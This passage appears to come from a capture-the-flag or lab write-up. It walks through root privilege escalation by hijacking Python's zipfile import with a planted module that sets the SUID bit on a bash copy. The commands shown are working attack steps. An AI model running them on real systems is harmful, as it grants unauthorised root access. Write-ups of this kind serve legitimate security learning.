6. Before doing something, I printed the content of the file backup.py and I tried to work out exactly what this file does . 

7. So this file is a automatic backup that takes folder or file, and compress it to a .zip. 
	The relevant vulnerability, is that when the file import zipfile, Python take the first zipfile script that it finds, and folder(s) in PYTHONPATH are search before everything. 

8. So in practical terms, we can create a fake zipfile script and put in PYTHONPATH so Python will take our fake script , before the real one. It is Python library hijacking.

9. So after create a folder in tmp/, we can create our fake zipfile script that will copy the /bin/bash and give the SUID bit. 
```
cat > /tmp/hijack/zipfile.py << 'EOF' 
import os os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash") 
EOF
```

10. And to execute the backup script in giving to python, a PYTHONPATH to firstly find our fake zipfile module -> 
	`sudo -u root PYTHONPATH=/tmp/hijack /usr/bin/python3 /opt/backup.py`

	And get the root shell with `/tmp/rootbash -p` and show the content of the file `/root/root.txt`.
